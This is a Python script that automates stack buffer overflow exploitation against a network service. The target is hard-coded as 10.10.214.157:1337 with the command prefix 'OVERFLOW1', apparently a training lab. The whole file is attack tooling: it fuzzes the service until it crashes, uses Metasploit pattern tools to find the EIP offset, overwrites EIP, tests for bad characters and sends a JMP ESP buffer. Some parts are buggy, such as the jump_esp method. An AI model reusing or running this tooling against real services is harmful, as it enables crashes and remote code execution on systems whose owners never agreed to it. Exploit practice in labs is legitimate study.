import socket
import time
import sys
import subprocess
import struct
import bchars
import importlib


class Overflow:

    def __init__(self, ip, port, prefix, length=0, offset=0):
        self.ip = ip
        self.port = port
        self.prefix = bytes(prefix, 'latin-1')
        self.length = length
        self.pattern = b""
        self.offset = offset
        self.all_chars = bytearray(range(1, 256))
        self.bad_chars = []

    def getLength(self):
        timeout = 5
        string = self.prefix.decode() + "A" * 100
        has_crashed = False
        while not has_crashed:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(timeout)
                    s.connect((self.ip, self.port))
                    s.recv(1024)
                    print("Fuzzing with {} bytes".format(
                        len(string)-len(self.prefix)))
                    s.send(bytes(string, 'latin-1'))
                    s.recv(1024)
            except Exception as e:
                has_crashed = True
                print(e)
                self.length = len(string)-len(self.prefix)
                amount = (len(string)-len(self.prefix))+400
                print("Fuzzing crashed at {} bytes".format(
                    len(string)-len(self.prefix)))
                print("Generating metasploit pattern...")
                result = subprocess.run(
                    ['/usr/share/metasploit-framework/tools/exploit/pattern_create.rb', '-l', str(amount)], capture_output=True)
                output = result.stdout.decode('latin-1')
                output = output.strip()
                self.pattern = bytes(output, 'latin-1')
                print(self.pattern)
                print("Done!")
            string += 100 * "A"
            time.sleep(1)

    def send_buffer(self, buffer):
        try:
            with socket.socket() as s:
                s.connect((self.ip, self.port))
                print("Sending evil buffer...")
                s.send(buffer)
                print("Done!")
        except Exception as e:
            print("Could not connect...")
            print(e)

    def find_EIP(self):
        input("Make sure to restart the program, enter y here when you have done it in order to send the EIP finding payload: ")
        buffer = b"".join([
            self.prefix,
            self.pattern,
        ])
        self.send_buffer(buffer)
        in_val = str(input("Enter EIP string: "))
        result = subprocess.run(
            ['/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb', '-q', in_val], capture_output=True)
        output = result.stdout
        val = int(output.strip().decode().replace(
            '[*] Exact match at offset ', ''))
        self.offset = val
        print("Printing offset value..")
        print(self.offset)

    def eip_overwrite(self):
        input("Make sure to restart the program, enter y here when you have done it in order to overwrite eip: ")
        new_eip = b"BBBB"
        buffer = b"".join([
            self.prefix,
            b"A"*self.offset,
            new_eip,
            b"C"*(self.length-len(new_eip)-self.offset),
        ])
        self.send_buffer(buffer)

    def find_chars(self):  # Start a while loop here, with input function to add and remove bad chars, run again and exit
        new_eip = b"BBBB"
        print(self.length)
        print(self.offset)
        all_found = False
        while not all_found:
            importlib.reload(bchars)
            self.bad_chars = bchars.bad_chars()
            stdin = str(
                input("Enter command (achr, dchr, nochars, run, exit): "))
            if stdin == "achr":
                inchar = bytes(input("Add byte: "), 'latin-1')
                #inchar = bytes(inchar, 'latin-1')
                # print(inchar)
                #inchar = inchar.decode('unicode-escape').encode('latin-1')
                self.bad_chars.append(inchar)
                print(self.all_chars)
                print(self.bad_chars)
            elif stdin == "dchr":
                outchar = bytes(input("Remove byte: "), 'latin-1')
                self.bad_chars.remove(outchar)
            elif stdin == "nochars":
                buffer = b"".join([
                    self.prefix,
                    b"A"*self.offset,
                    new_eip,
                    self.all_chars,
                    b"C"*(self.length-len(new_eip) -
                          self.offset-len(self.all_chars)),
                ])
                self.send_buffer(buffer)
            elif stdin == "exit":
                all_found = True
                print(self.bad_chars)
            elif stdin == "run":
                for bad_char in bchars.bad_chars():
                    self.all_chars = self.all_chars.replace(bad_char, b"")
                buffer = b"".join([
                    self.prefix,
                    b"A"*self.offset,
                    new_eip,
                    self.all_chars,
                    b"C"*(self.length-len(new_eip) -
                          self.offset-len(self.all_chars)),
                ])
                self.send_buffer(buffer)

    def p32(self, data):
        return struct.pack('<I', data)

    def jump_esp(self):
        jmp_esp = input("Type in esp string: ")
        jmp_esp = self.p32(jmp_esp)
        buffer = b"".join([
            prefix,
            b"A"*self.offset,
            jmp_esp,
            b"C"*(self.length-len(jmp_esp) - self.offset),
        ])
        self.send_buffer(buffer)


ip = "10.10.214.157"
port = 1337
prefix = "OVERFLOW1 "
help = """
Usage: automated_overflow.py [options]
 _____________ ___________
| Name        | Parameter |
|-------------|-----------|
| IP          | -u        |
| Prefix      | -m        |
| Custom mode | -c        |
| Length      | -l        |
| Offset      | -o        |
| Help        | -h        |
|_____________|___________|
"""
if "-h" in sys.argv:
    print(help)
    sys.exit(0)
if "-u" in sys.argv:
    ip = str(sys.argv[sys.argv.index("-u")+1])
if "-m" in sys.argv:
    prefix = str(sys.argv[sys.argv.index("-m")+1])
if "-c" in sys.argv:
    length = int(sys.argv[sys.argv.index("-l")+1])
    offset = int(sys.argv[sys.argv.index("-o")+1])
    c = Overflow(ip=ip, port=port, prefix=prefix, length=length, offset=offset)
    c.find_chars()
else:
    c = Overflow(ip="10.10.214.157", port=1337, prefix=prefix)
    c.getLength()
    c.find_EIP()
    c.eip_overwrite()
    c.find_chars()
